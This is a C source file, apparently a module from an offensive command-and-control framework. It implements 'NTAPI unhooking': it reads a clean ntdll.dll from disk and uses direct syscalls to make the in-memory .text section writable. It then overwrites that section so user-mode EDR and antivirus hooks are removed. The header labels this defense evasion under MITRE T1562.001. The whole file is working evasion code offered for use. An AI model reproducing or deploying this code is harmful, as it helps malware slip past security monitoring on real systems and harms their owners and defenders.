/**
 * NTAPI Unhooking Module - Defense Evasion
 * ========================================
 * 
 * Features:
 * - Reads a clean copy of ntdll.dll from disk
 * - Maps the clean .text section over the hooked one in memory
 * - Bypasses all user-mode API hooks (EDR/AV evasion)
 * - Uses direct syscalls for memory protection manipulation
 * - Position-independent logic
 * 
 * MITRE: T1562.001 (Impair Defenses)
 * Author: Fitnah C2 Team
 * Version: 1.0.0
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>

// Direct syscall wrappers (from direct_syscall.c)
extern NTSTATUS Syscall_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

/**
 * UnhookNtdll - Restore ntdll.dll .text section from disk
 */
BOOL UnhookNtdll() {
    HANDLE hFile = NULL;
    HANDLE hSection = NULL;
    PVOID pCleanNtdll = NULL;
    PVOID pLocalNtdll = GetModuleHandleA("ntdll.dll");
    
    if (!pLocalNtdll) return FALSE;

    // 1. Open ntdll.dll from System32
    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat(ntdllPath, "\\ntdll.dll");

    hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    // 2. Create a mapping for the clean file
    hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hSection) {
        CloseHandle(hFile);
        return FALSE;
    }

    // 3. Map the clean ntdll into memory
    pCleanNtdll = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (!pCleanNtdll) {
        CloseHandle(hSection);
        CloseHandle(hFile);
        return FALSE;
    }

    // 4. Find .text section in local ntdll
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pLocalNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((LPBYTE)pLocalNtdll + pDos->e_lfanew);
    
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt) + i;
        
        if (strcmp((LPCSTR)pSection->Name, ".text") == 0) {
            PVOID pTarget = (LPBYTE)pLocalNtdll + pSection->VirtualAddress;
            PVOID pSource = (LPBYTE)pCleanNtdll + pSection->VirtualAddress;
            SIZE_T size = pSection->Misc.VirtualSize;

            // 5. Change protection to RWX (using syscall for stealth)
            DWORD oldProtect;
            PVOID pBase = pTarget;
            SIZE_T regionSize = size;
            
            // Note: We use Syscall_NtProtectVirtualMemory to bypass hooks on VirtualProtect
            NTSTATUS status = Syscall_NtProtectVirtualMemory(
                GetCurrentProcess(),
                &pBase,
                &regionSize,
                PAGE_EXECUTE_READWRITE,
                &oldProtect
            );

            if (NT_SUCCESS(status)) {
                // 6. Overwrite hooked .text with clean bytes
                memcpy(pTarget, pSource, size);
                
                // 7. Restore protection
                Syscall_NtProtectVirtualMemory(
                    GetCurrentProcess(),
                    &pBase,
                    &regionSize,
                    oldProtect,
                    &oldProtect
                );
            }
            break;
        }
    }

    // Cleanup
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hSection);
    CloseHandle(hFile);

    return TRUE;
}
